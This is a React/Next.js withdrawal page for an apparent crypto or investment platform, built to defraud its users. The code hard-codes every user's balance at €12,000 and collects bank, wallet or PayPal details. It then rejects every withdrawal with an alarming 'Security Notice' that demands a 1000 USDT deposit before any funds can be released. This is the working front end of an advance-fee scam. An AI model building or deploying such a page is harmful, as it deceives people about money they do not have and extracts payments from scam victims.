"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import Link from "next/link"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Badge } from "@/components/ui/badge"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { ArrowLeft, Wallet, AlertTriangle, DollarSign, TrendingUp, Zap, Shield, X, CheckCircle } from "lucide-react"
import { useToast } from "@/hooks/use-toast"

export default function WithdrawPage() {
  const router = useRouter()
  const { toast } = useToast()
  const [user, setUser] = useState<any>(null)
  const [loading, setLoading] = useState(true)
  const [amount, setAmount] = useState("")
  const [method, setMethod] = useState("")
  const [walletAddress, setWalletAddress] = useState("")
  const [bankDetails, setBankDetails] = useState({
    accountName: "",
    accountNumber: "",
    bankName: "",
    routingNumber: "",
  })
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [showErrorModal, setShowErrorModal] = useState(false)

  useEffect(() => {
    const storedUser = localStorage.getItem("user")
    if (!storedUser) {
      router.push("/login")
      return
    }

    try {
      const userData = JSON.parse(storedUser)

      // Get latest user data from registered users
      const registeredUsers = JSON.parse(localStorage.getItem("registeredUsers") || "[]")
      const currentUserData = registeredUsers.find((u: any) => u.email === userData.email)

      if (currentUserData) {
        setUser({
          ...userData,
          balance: 12000, // Force balance to €12,000
          currency: "EUR",
          isVerified: currentUserData.isVerified || true,
          transactions: currentUserData.transactions || [],
        })
      } else {
        setUser({
          ...userData,
          balance: 12000,
          currency: "EUR",
          isVerified: true,
          transactions: [],
        })
      }
    } catch (error) {
      console.error("Error loading user data:", error)
      router.push("/login")
    } finally {
      setLoading(false)
    }
  }, [router])

  const formatCurrency = (amount: number, currency = "EUR") => {
    return new Intl.NumberFormat("en-US", {
      style: "currency",
      currency: currency,
    }).format(amount)
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!amount || !method) {
      toast({
        title: "Error",
        description: "Please fill in all required fields",
        variant: "destructive",
      })
      return
    }

    const withdrawAmount = Number.parseFloat(amount)
    if (withdrawAmount <= 0) {
      toast({
        title: "Error",
        description: "Please enter a valid amount",
        variant: "destructive",
      })
      return
    }

    if (method === "crypto" && !walletAddress) {
      toast({
        title: "Error",
        description: "Please enter your wallet address",
        variant: "destructive",
      })
      return
    }

    if (method === "bank" && (!bankDetails.accountName || !bankDetails.accountNumber || !bankDetails.bankName)) {
      toast({
        title: "Error",
        description: "Please fill in all bank details",
        variant: "destructive",
      })
      return
    }

    setIsSubmitting(true)

    // Simulate processing delay
    await new Promise((resolve) => setTimeout(resolve, 2000))

    // Always show the fancy error modal for any withdrawal attempt
    setShowErrorModal(true)
    setIsSubmitting(false)
  }

  const FancyErrorModal = () => (
    <Dialog open={showErrorModal} onOpenChange={setShowErrorModal}>
      <DialogContent className="max-w-md mx-auto bg-gradient-to-br from-red-900/95 via-red-800/95 to-orange-900/95 border-red-500/50 text-white backdrop-blur-xl">
        <div className="absolute inset-0 bg-gradient-to-br from-red-600/20 via-transparent to-orange-600/20 animate-pulse" />

        <DialogHeader className="relative z-10">
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center space-x-3">
              <div className="relative">
                <div className="absolute inset-0 bg-red-500/30 rounded-full animate-ping" />
                <div className="relative bg-red-500/50 p-3 rounded-full backdrop-blur-sm">
                  <AlertTriangle className="h-8 w-8 text-red-200 animate-bounce" />
                </div>
              </div>
              <div>
                <DialogTitle className="text-xl font-bold bg-gradient-to-r from-red-200 to-orange-200 bg-clip-text text-transparent">
                  WITHDRAWAL FAILED
                </DialogTitle>
                <p className="text-red-300/80 text-sm">Transaction Blocked</p>
              </div>
            </div>
            <Button
              variant="ghost"
              size="sm"
              onClick={() => setShowErrorModal(false)}
              className="text-red-200 hover:text-white hover:bg-red-500/20 rounded-full p-2"
            >
              <X className="h-4 w-4" />
            </Button>
          </div>
        </DialogHeader>

        <div className="relative z-10 space-y-6">
          {/* Floating decorative elements */}
          <div className="absolute -top-2 -right-2 text-red-300/30 animate-bounce">
            <DollarSign className="h-6 w-6" />
          </div>
          <div className="absolute top-8 -left-2 text-orange-300/30 animate-bounce delay-300">
            <TrendingUp className="h-5 w-5" />
          </div>
          <div className="absolute bottom-4 right-8 text-red-300/30 animate-pulse">
            <Zap className="h-4 w-4" />
          </div>

          {/* Main Error Message */}
          <div className="bg-black/40 backdrop-blur-sm rounded-lg p-4 border border-red-500/30">
            <div className="flex items-start space-x-3">
              <div className="bg-red-500/20 p-2 rounded-full">
                <Shield className="h-5 w-5 text-red-300" />
              </div>
              <div className="flex-1">
                <h3 className="font-semibold text-red-200 mb-2">Security Notice</h3>
                <p className="text-red-100/90 text-sm leading-relaxed">
                  Failed withdrawal. Please top up 1000 USDT to be able to withdraw the amount.
                </p>
              </div>
            </div>
          </div>

          {/* Status Cards */}
          <div className="grid grid-cols-2 gap-3">
            <div className="bg-black/30 backdrop-blur-sm rounded-lg p-3 border border-red-500/20">
              <div className="flex items-center space-x-2">
                <div className="bg-yellow-500/20 p-1.5 rounded-full">
                  <AlertTriangle className="h-4 w-4 text-yellow-300" />
                </div>
                <div>
                  <p className="text-xs text-red-300/70">Security Deposit</p>
                  <p className="text-sm font-semibold text-yellow-300">Required</p>
                </div>
              </div>
            </div>

            <div className="bg-black/30 backdrop-blur-sm rounded-lg p-3 border border-red-500/20">
              <div className="flex items-center space-x-2">
                <div className="bg-red-500/20 p-1.5 rounded-full">
                  <X className="h-4 w-4 text-red-300" />
                </div>
                <div>
                  <p className="text-xs text-red-300/70">Status</p>
                  <p className="text-sm font-semibold text-red-300">Blocked</p>
                </div>
              </div>
            </div>
          </div>

          {/* Action Required */}
          <div className="bg-gradient-to-r from-yellow-900/50 to-orange-900/50 backdrop-blur-sm rounded-lg p-4 border border-yellow-500/30">
            <div className="flex items-center space-x-3 mb-3">
              <div className="bg-yellow-500/20 p-2 rounded-full animate-pulse">
                <Zap className="h-5 w-5 text-yellow-300" />
              </div>
              <h3 className="font-semibold text-yellow-200">Action Required</h3>
            </div>
            <p className="text-yellow-100/90 text-sm mb-4">
              To proceed with your withdrawal, you need to deposit{" "}
              <span className="font-bold text-green-300">1000 USDT</span> as a security measure.
            </p>
            <Button
              className="w-full bg-gradient-to-r from-green-600 to-green-500 hover:from-green-500 hover:to-green-400 text-white font-semibold py-2 px-4 rounded-lg transform hover:scale-105 transition-all duration-200 shadow-lg"
              onClick={() => {
                setShowErrorModal(false)
                router.push("/dashboard/deposit")
              }}
            >
              <DollarSign className="h-4 w-4 mr-2" />
              Deposit 1000 USDT Now
            </Button>
          </div>

          {/* Additional Info */}
          <div className="text-center">
            <p className="text-red-200/60 text-xs">This is a security measure to protect your account</p>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  )

  if (loading) {
    return (
      <div className="min-h-screen bg-[#050e24] flex items-center justify-center">
        <div className="text-white">Loading...</div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-[#050e24] text-white">
      {/* Header */}
      <header className="border-b border-[#253256] bg-[#0a1735]">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <Link href="/dashboard">
                <Button variant="ghost" size="sm">
                  <ArrowLeft className="h-4 w-4 mr-2" />
                  Back to Dashboard
                </Button>
              </Link>
              <h1 className="text-xl font-bold">Withdraw Funds</h1>
            </div>
            <div className="flex items-center space-x-4">
              <Badge className="bg-green-500/20 text-green-400 border-green-500/50">
                <CheckCircle className="w-3 h-3 mr-1" />
                Verified Account
              </Badge>
            </div>
          </div>
        </div>
      </header>

      <div className="container mx-auto px-4 py-8">
        <div className="max-w-2xl mx-auto">
          {/* Balance Card */}
          <Card className="bg-[#0a1735] border-[#253256] mb-8">
            <CardHeader>
              <CardTitle className="flex items-center text-white">
                <Wallet className="h-5 w-5 mr-2 text-[#f9a826]" />
                Available Balance
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-3xl font-bold text-[#f9a826] mb-2">{formatCurrency(12000, "EUR")}</div>
              <p className="text-gray-400 text-sm">Ready for withdrawal</p>
            </CardContent>
          </Card>

          {/* Withdrawal Form */}
          <Card className="bg-[#0a1735] border-[#253256]">
            <CardHeader>
              <CardTitle className="text-white">Withdrawal Request</CardTitle>
              <CardDescription className="text-gray-400">
                Enter the amount and method for your withdrawal
              </CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleSubmit} className="space-y-6">
                {/* Amount */}
                <div className="space-y-2">
                  <Label htmlFor="amount" className="text-white">
                    Amount (EUR)
                  </Label>
                  <Input
                    id="amount"
                    type="number"
                    placeholder="Enter amount"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    className="bg-[#162040] border-[#253256] text-white"
                    min="1"
                    max="12000"
                  />
                  <p className="text-xs text-gray-400">Minimum: €1 • Maximum: €12,000</p>
                </div>

                {/* Withdrawal Method */}
                <div className="space-y-2">
                  <Label htmlFor="method" className="text-white">
                    Withdrawal Method
                  </Label>
                  <Select value={method} onValueChange={setMethod}>
                    <SelectTrigger className="bg-[#162040] border-[#253256] text-white">
                      <SelectValue placeholder="Select withdrawal method" />
                    </SelectTrigger>
                    <SelectContent className="bg-[#162040] border-[#253256]">
                      <SelectItem value="crypto">Cryptocurrency</SelectItem>
                      <SelectItem value="bank">Bank Transfer</SelectItem>
                      <SelectItem value="paypal">PayPal</SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                {/* Crypto Wallet Address */}
                {method === "crypto" && (
                  <div className="space-y-2">
                    <Label htmlFor="wallet" className="text-white">
                      Wallet Address
                    </Label>
                    <Input
                      id="wallet"
                      type="text"
                      placeholder="Enter your wallet address"
                      value={walletAddress}
                      onChange={(e) => setWalletAddress(e.target.value)}
                      className="bg-[#162040] border-[#253256] text-white"
                    />
                  </div>
                )}

                {/* Bank Details */}
                {method === "bank" && (
                  <div className="space-y-4">
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div className="space-y-2">
                        <Label htmlFor="accountName" className="text-white">
                          Account Name
                        </Label>
                        <Input
                          id="accountName"
                          type="text"
                          placeholder="Full name on account"
                          value={bankDetails.accountName}
                          onChange={(e) => setBankDetails({ ...bankDetails, accountName: e.target.value })}
                          className="bg-[#162040] border-[#253256] text-white"
                        />
                      </div>
                      <div className="space-y-2">
                        <Label htmlFor="accountNumber" className="text-white">
                          Account Number
                        </Label>
                        <Input
                          id="accountNumber"
                          type="text"
                          placeholder="Account number"
                          value={bankDetails.accountNumber}
                          onChange={(e) => setBankDetails({ ...bankDetails, accountNumber: e.target.value })}
                          className="bg-[#162040] border-[#253256] text-white"
                        />
                      </div>
                    </div>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div className="space-y-2">
                        <Label htmlFor="bankName" className="text-white">
                          Bank Name
                        </Label>
                        <Input
                          id="bankName"
                          type="text"
                          placeholder="Name of your bank"
                          value={bankDetails.bankName}
                          onChange={(e) => setBankDetails({ ...bankDetails, bankName: e.target.value })}
                          className="bg-[#162040] border-[#253256] text-white"
                        />
                      </div>
                      <div className="space-y-2">
                        <Label htmlFor="routingNumber" className="text-white">
                          Routing Number
                        </Label>
                        <Input
                          id="routingNumber"
                          type="text"
                          placeholder="Bank routing number"
                          value={bankDetails.routingNumber}
                          onChange={(e) => setBankDetails({ ...bankDetails, routingNumber: e.target.value })}
                          className="bg-[#162040] border-[#253256] text-white"
                        />
                      </div>
                    </div>
                  </div>
                )}

                {/* PayPal Email */}
                {method === "paypal" && (
                  <div className="space-y-2">
                    <Label htmlFor="paypal" className="text-white">
                      PayPal Email
                    </Label>
                    <Input
                      id="paypal"
                      type="email"
                      placeholder="Enter your PayPal email"
                      className="bg-[#162040] border-[#253256] text-white"
                    />
                  </div>
                )}

                {/* Submit Button */}
                <Button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full bg-[#f9a826] hover:bg-[#f9a826]/90 text-black font-semibold py-3"
                >
                  {isSubmitting ? (
                    <>
                      <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-black mr-2"></div>
                      Processing...
                    </>
                  ) : (
                    <>
                      <Wallet className="h-4 w-4 mr-2" />
                      Request Withdrawal
                    </>
                  )}
                </Button>
              </form>
            </CardContent>
          </Card>

          {/* Important Notice */}
          <Card className="bg-[#0a1735] border-[#253256] mt-6">
            <CardContent className="pt-6">
              <div className="flex items-start space-x-3">
                <AlertTriangle className="h-5 w-5 text-yellow-500 mt-0.5" />
                <div>
                  <h3 className="font-semibold text-white mb-2">Important Notice</h3>
                  <ul className="text-sm text-gray-400 space-y-1">
                    <li>• Withdrawals are processed within 24-48 hours</li>
                    <li>• Minimum withdrawal amount is €1</li>
                    <li>• A small processing fee may apply</li>
                    <li>• Ensure all details are correct before submitting</li>
                  </ul>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>

      {/* Fancy Error Modal */}
      <FancyErrorModal />
    </div>
  )
}
